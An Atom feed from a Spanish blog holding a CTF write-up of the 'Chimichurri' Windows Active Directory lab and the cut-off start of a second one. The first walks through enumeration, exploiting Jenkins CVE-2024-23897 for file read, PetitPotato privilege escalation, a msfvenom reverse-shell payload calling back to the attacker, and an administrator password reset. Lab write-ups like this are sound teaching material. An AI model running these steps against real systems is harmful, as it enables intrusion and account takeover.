<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-02T21:40:11+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Chimichurri</title><link href="/posts/chimichurri/" rel="alternate" type="text/html" title="Chimichurri" /><published>2024-07-02T00:00:00+00:00</published><updated>2024-07-02T00:00:00+00:00</updated><id>/posts/chimichurri</id><content type="html" xml:base="/posts/chimichurri/"><![CDATA[<p><img src="/assets/images/chimichurri/chim.jpg" alt="image" /></p>

<p>Estamos ante una máquina Windows, Active Directory, de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de nuestra red para averiguar que máquinas hay en ella:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth2 <span class="nt">--localnet</span>
Interface: eth2, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:82:61:c8, IPv4: 192.168.200.100
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.200.1   52:54:00:12:35:00       QEMU
192.168.200.2   52:54:00:12:35:00       QEMU
192.168.200.4   08:00:27:0d:f5:f8       PCS Systemtechnik GmbH

</code></pre></div></div>

<h1 id="enumeración">Enumeración</h1>

<p>Como vemos la máquina tiene asignada la IP <strong>192.168.200.4</strong>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que nos guarde a un fichero grepeable <code class="language-plaintext highlighter-rouge">-oG</code> con nombre <code class="language-plaintext highlighter-rouge">ports.txt</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">192.168.200.4</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 192.168.200.4 <span class="nt">-oG</span> ports.txt
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
6969/tcp  open  acmsoda
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49688/tcp open  unknown
</code></pre></div></div>

<p>Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>ports.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688
</code></pre></div></div>

<p>Ahora hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688 <span class="nt">-v</span> 192.168.200.4
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-07-02 05:07:02Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6969/tcp  open  http          Jetty 10.0.11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Panel de control <span class="o">[</span>Jenkins]
|_http-server-header: Jetty<span class="o">(</span>10.0.11<span class="o">)</span>
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:0D:F5:F8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: Host: CHIMICHURRI<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:0d:f5:f8 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
| Names:
|   CHIMICHURRI&lt;00&gt;      Flags: &lt;unique&gt;&lt;active&gt;
|   CHIMICHURRI0&lt;00&gt;     Flags: &lt;group&gt;&lt;active&gt;
|   CHIMICHURRI0&lt;1c&gt;     Flags: &lt;group&gt;&lt;active&gt;
|   CHIMICHURRI&lt;20&gt;      Flags: &lt;unique&gt;&lt;active&gt;
|_  CHIMICHURRI0&lt;1b&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|_clock-skew: <span class="nt">-15s</span>
| smb2-time: 
|   <span class="nb">date</span>: 2024-07-02T05:07:55
|_  start_date: 2024-07-02T04:58:47
</code></pre></div></div>

<p>Añadimos nombre de dominio a nuestro fichero de hosts:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"192.168.200.4 chimichurri.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
192.168.200.4 chimichurri.thl
</code></pre></div></div>

<p>Para empezar vamos a mirar si hay algún recurso compartido al que se pueda acceder sin credenciales en el servicio <strong>smb</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> <span class="se">\\</span>192.168.200.4        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Admin remota
        C<span class="nv">$ </span>             Disk      Recurso predeterminado
        drogas          Disk      
        IPC<span class="nv">$ </span>           IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión
</code></pre></div></div>

<p>Encontramos un recurso compartido con el nombre <strong>drogas</strong>, nos conectamos a el para ver que contiene:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> //192.168.200.4/drogas
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu Jun 27 12:20:49 2024
  ..                                  D        0  Thu Jun 27 12:20:49 2024
  credenciales.txt                    A       95  Sun Jun 30 19:19:03 2024

                7735807 blocks of size 4096. 3942367 blocks available
</code></pre></div></div>

<p>Encontramos un fichero <strong>credenciales.txt</strong>. Lo descargamos a nuestra máquina con el comando <code class="language-plaintext highlighter-rouge">get</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get credenciales.txt 
getting file <span class="se">\c</span>redenciales.txt of size 95 as credenciales.txt <span class="o">(</span>30.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 30.9 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<p>En nuestro equipo leemos el contenido de dicho fichero:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>credenciales.txt 
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
</code></pre></div></div>

<p>De ese texto presumimos que hay un fichero <strong>perico.txt</strong> en el escritorio del usuario <strong>hacker.</strong></p>

<p>Ahora pasamos a ver si hay alguna vulnerabilidad en el servicio web. Como hemos visto antes, en el puerto <strong>6969</strong> hay un servicio web. Empezamos buscando información de que tecnología esta usando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb <span class="nt">-a</span> 3 http://192.168.200.4:6969
http://192.168.200.4:6969 <span class="o">[</span>200 OK] Cookies[JSESSIONID.d01cdd8a], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty<span class="o">(</span>10.0.11<span class="o">)]</span>, HttpOnly[JSESSIONID.d01cdd8a], IP[192.168.200.4], Jenkins[2.361.4], Jetty[10.0.11], OpenSearch[/opensearch.xml], Prototype, Script[text/javascript], Title[Panel de control <span class="o">[</span>Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
</code></pre></div></div>

<p>Vemos que está usando el framework <strong>Jenkins</strong> versión <strong>2.361.4</strong>.</p>

<h1 id="intrusión">Intrusión</h1>

<p>Buscamos en la web del incibe a ver si esa versión de Jenkins tiene alguna vulnerabilidad.  Vemos que hay una vulnerabilidad con CVE CVE-2024-23897 que permite la lectura arbitraria de archivos.</p>

<p><a href="https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins">https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins</a></p>

<p>Buscamos con <strong>searchsploit</strong> a ver si tenemos algún exploit disponible (si no encuentra probar a hacer searchsploit -u para actualizar la BBDD):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit jenkins CVE-2024-23897 

 Exploit Title               |  Path
<span class="nt">-----------------------------</span> <span class="nt">---------------------------------</span>
Jenkins 2.441 - Local File I | java/webapps/51993.py
</code></pre></div></div>

<p>Vemos que hay un exploit disponible, nos lo copiamos a nuestra carpeta de trabajo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/exploitdb/exploits/java/webapps/51993.py <span class="nb">.</span>
</code></pre></div></div>

<p>Ejecutamos el exploit y le indicamos la url con <strong>-u</strong> y el path del fichero con <strong>-p</strong>. En este caso no es necesario añadirle la unidad (c:):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python 51993.py <span class="nt">-u</span> http://192.168.200.4:6969 <span class="nt">-p</span> /users/hacker/desktop/perico.txt
hacker:Perico69
</code></pre></div></div>

<p>Nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y las credenciales recién obtenidas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.200.4 <span class="nt">-u</span> hacker <span class="nt">-p</span> Perico69
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<p>Vemos que privilegios tiene el usuario <strong>hacker</strong> en la máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv

INFORMACIàN DE PRIVILEGIOS
<span class="nt">--------------------------</span>

Nombre de privilegio          Descripci¢n                                  Estado
<span class="o">=============================</span> <span class="o">============================================</span> <span class="o">==========</span>
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Como tiene el privilegio <strong>SeImpersonatePrivilege</strong> habilitado procedemos a hacer la escalada usando alguna de las herramientas disponibles, en este caso <strong>PetitPotato</strong>. Nos descargamos el binario de su github:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
</code></pre></div></div>

<p>Para compartir ficheros con la máquina victima creamos un servidor samba en nuestra máquina. Usamos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para crear el server, <strong>-smb2support</strong> para dar soporte a smb2, <strong>kali</strong> es el nombre que le doy al recurso compartido y <strong>.</strong> para compartir lo que tenemos en el directorio actual.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver <span class="nt">-smb2support</span> kali <span class="nb">.</span>               
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<p>Ejecutamos <strong>PetitPotato</strong> para obtener una <strong>cmd</strong>, pero vemos que persiste:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\d</span>esktop&gt; <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\P</span>etitPotato.exe 3 cmd

<span class="o">[</span>+] Malicious named pipe running on <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\p</span>etit<span class="se">\p</span>ipe<span class="se">\s</span>rvsvc.
<span class="o">[</span>+] Invoking EfsRpcQueryUsersOnFile with target path: <span class="se">\\</span>localhost/pipe/petit<span class="se">\C</span><span class="nv">$\</span>wh0nqs.txt.

<span class="o">[</span>+] The connection is successful.
<span class="o">[</span>+] ImpersonateNamedPipeClient OK.
<span class="o">[</span>+] OpenThreadToken OK.
<span class="o">[</span>+] DuplicateTokenEx OK.
<span class="o">[</span>+] CreateProcessAsUser OK.
Microsoft Windows <span class="o">[</span>Versi¢n 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\d</span>esktop&gt;
</code></pre></div></div>

<p>Vamos a intentar crear una shell reversa al ejecutar <strong>PetitPotato</strong>. Para ello, primero creamos un ejecutable con msfvenom para que nos de una shell reversa.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.200.100 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
</code></pre></div></div>

<p>La copiamos en la máquina victima:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; copy <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nb">.</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; <span class="nb">dir

    </span>Directorio: C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments

Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         7/2/2024  10:25 PM          73802 shell.exe
</code></pre></div></div>

<p>Nos ponemos a la escucha en nuestra máquina atacante y ejecutamos <strong>PetitPotato</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\P</span>etitPotato.exe 2 .<span class="se">\s</span>hell.exe

<span class="o">[</span>+] Malicious named pipe running on <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\p</span>etit<span class="se">\p</span>ipe<span class="se">\s</span>rvsvc.
<span class="o">[</span>+] Invoking EfsRpcDecryptFileSrv with target path: <span class="se">\\</span>localhost/pipe/petit<span class="se">\C</span><span class="nv">$\</span>wh0nqs.txt.

<span class="o">[</span>+] The connection is successful.
<span class="o">[</span>+] ImpersonateNamedPipeClient OK.
<span class="o">[</span>+] OpenThreadToken OK.
<span class="o">[</span>+] DuplicateTokenEx OK.
<span class="o">[</span>+] CreateProcessAsUser OK.
</code></pre></div></div>

<p>Obtenemos la shell como <strong>nt authority\system</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...
connect to <span class="o">[</span>192.168.200.100] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.200.4] 62914
Microsoft Windows <span class="o">[</span>Versi?n 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>Ahora para obtener el acceso como <strong>Administrador</strong> lo que he hecho es cambiar la contraseña del usuario <strong>Administrador</strong> con <code class="language-plaintext highlighter-rouge">net user</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net user administrador Murrusko0
net user administrador Murrusko0
Se ha completado el comando correctamente.
</code></pre></div></div>

<p>Una vez cambiada nos conectamos usando dichas credenciales:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 192.168.200.4 <span class="nt">-u</span> administrador <span class="nt">-p</span> Murrusko0
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrador<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>chimichurri0<span class="se">\a</span>dministrador
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrador<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<p>Y con esto damos por finalizada la máquina.</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="AD" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Predictable</title><link href="/posts/predictable/" rel="alternate" type="text/html" title="Predictable" /><published>2024-07-02T00:00:00+00:00</published><updated>2024-07-02T00:00:00+00:00</updated><id>/posts/predictable</id><content type="html" xml:base="/posts/predictable/"><![CDATA[<p><img src="/assets/images/predictable/pred.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel muy difícil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver
</code></pre></div></div>

<p>Vemos que tiene los puertos 22 y 1111 abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,1111 <span class="nt">-v</span> 172.17.0.2
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 9.7p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 fa:76:8a:ad:3c:33:1b:58:65:ba:74:ca:8a:7b:03:33 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 bc:f7:8f:f4:2d:d6:c9:66:0f:a8:7c:79:32:af:a4:79 <span class="o">(</span>ED25519<span class="o">)</span>
1111/tcp open  lmsocialserver?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.11.9
|     Date: Tue, 25 Jun 2024 23:57:02 GMT
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 12161
|     Vary: Cookie
|     Set-Cookie: <span class="nv">session</span><span class="o">=</span>eyJzZWVkIjoxNzE5MzU5ODIyfQ.ZntZTg.hhPjeoeYGV9K7YuwoMZANlhLvKQ<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
|     Connection: close
|     &lt;<span class="o">!</span><span class="nt">--</span>
|     class prng_lcg:
|     9223372036854775783
|     __init__<span class="o">(</span>self, <span class="nv">seed</span><span class="o">=</span>None<span class="o">)</span>:
|     self.state <span class="o">=</span> seed
|     next<span class="o">(</span>self<span class="o">)</span>:
|     self.state <span class="o">=</span> <span class="o">(</span>self.state <span class="k">*</span> self.m + self.c<span class="o">)</span> % self.n
|     <span class="k">return </span>self.state
|     <span class="k">return </span>int
|     obtener_semilla<span class="o">()</span>:
|     <span class="k">return </span>time.time_ns<span class="o">()</span>
|     obtener_semilla_anterior<span class="o">()</span>:
|     <span class="k">return </span>obtener_semilla<span class="o">()</span> - 1
|     <span class="s1">'seed'</span> not <span class="k">in </span>session:
|     session[<span class="s1">'seed'</span><span class="o">]</span> <span class="o">=</span> obtener_semilla<span class="o">()</span>
|     prng_lcg<span class="o">(</span>session[<span class="s1">'seed'</span><span class="o">])</span>
|     prng_lcg<span class="o">(</span>session[<span class="s1">'seed'</span><span class="o">])</span>
|     semilla_anterior <span class="o">=</span> obtener_semilla_anterior<span class="o">()</span>
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|   Help: 
|     &lt;<span class="o">!</span>DOCTYPE HTML&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;title&gt;Error response&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;Error response&lt;/h1&gt;
|     &lt;p&gt;Error code: 400&lt;/p&gt;
|     &lt;p&gt;Message: Bad request syntax <span class="o">(</span><span class="s1">'HELP'</span><span class="o">)</span>.&lt;/p&gt;
|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
</code></pre></div></div>

<p>Vemos que es un servidor de <code class="language-plaintext highlighter-rouge">Werkzeug/3.0.3 Python/3.11.9</code> y lo que parece parte del código que usa la aplicación de la web.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">prng_lcg</span><span class="p">:</span>
    <span class="n">m</span> <span class="o">=</span> 
    <span class="n">c</span> <span class="o">=</span>
    <span class="n">n</span> <span class="o">=</span> <span class="mi">9223372036854775783</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">seed</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">seed</span>

    <span class="k">def</span> <span class="nf">next</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
